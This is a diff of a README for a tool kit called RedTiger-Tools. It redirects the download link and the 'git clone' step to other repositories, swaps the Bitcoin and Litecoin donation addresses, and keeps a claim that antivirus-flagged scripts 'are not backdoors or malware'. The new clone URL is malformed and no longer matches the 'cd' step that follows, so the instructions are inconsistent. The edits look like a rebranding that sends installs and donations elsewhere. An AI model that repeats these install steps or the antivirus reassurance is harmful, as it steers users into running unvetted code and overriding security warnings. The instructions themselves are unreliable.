@@ -162,7 +162,7 @@
 
 <h1 align="center">Installation</h1>
 
-<a href="https://github.com/loxy0dev/RedTiger-Tools/archive/refs/tags/v6.3.zip">Dowloads "RedTiger-Tools.zip" Here</a>
+<a href="https://github.com/loxy0dev/Multi-tools/archive/refs/tags/v6.3.zip">Dowloads "RedTiger-Tools.zip" Here</a>
 
 <p>
   
@@ -174,7 +174,7 @@
 Or
 ```
 1 - Open a terminal.
-2 - Write "git clone https://github.com/loxy0dev/RedTiger-Tools.git"
+2 - Write "git clone https://github.com/GrindLord231-Tools.git"
 3 - Write "cd RedTiger-Tools"
 4 - Write "git pull"
 5 - Write "python Setup.py"
@@ -186,10 +186,10 @@ Or
 
 <p>
   
-  - RedTiger Tools has been developed solely for educational purposes.<br>
+  - multi Tools has been developed solely for educational purposes.<br>
   - This project has been created with good intentions and is intended for personal use only.<br>
   - By choosing to use RedTiger, you acknowledge and accept full responsibility for any consequences that may result from your actions.<br>
-  - All scripts in the "<a href="https://github.com/loxy0dev/RedTiger-Tools/tree/main/Program/FileDetectedByAntivirus">Program/FileDetectedByAntivirus</a>" folder are <strong>detected by the antivirus</strong> but pose no threat to you. These are <strong>not backdoors or malware</strong>.
+  - All scripts in the "<a href="https://github.com/GrindLord231-Tools/tree/main/Program/FileDetectedByAntivirus">Program/FileDetectedByAntivirus</a>" folder are <strong>detected by the antivirus</strong> but pose no threat to you. These are <strong>not backdoors or malware</strong>.
 <br><br>
 </p>
 
@@ -199,11 +199,11 @@ Or
   
   <strong>Bitcoin Adress:</strong>
   ``` 
-1MSRzopmhasr9ByHBrksScqv6wByVagDKe
+bc1qncvunvnsdqqn8zl69sq7264ecp8lxe3sezfnft
   ```
   <strong>Litecoin Adress:</strong>
   ```
-LXXnPk5hbUxNomJixbysoikZSv6QAiQyVQ
+ltc1qyx7sfpsxdqj8660xejpl2u2e36ey9y5ac3mnvk
   ```
 
 </p>
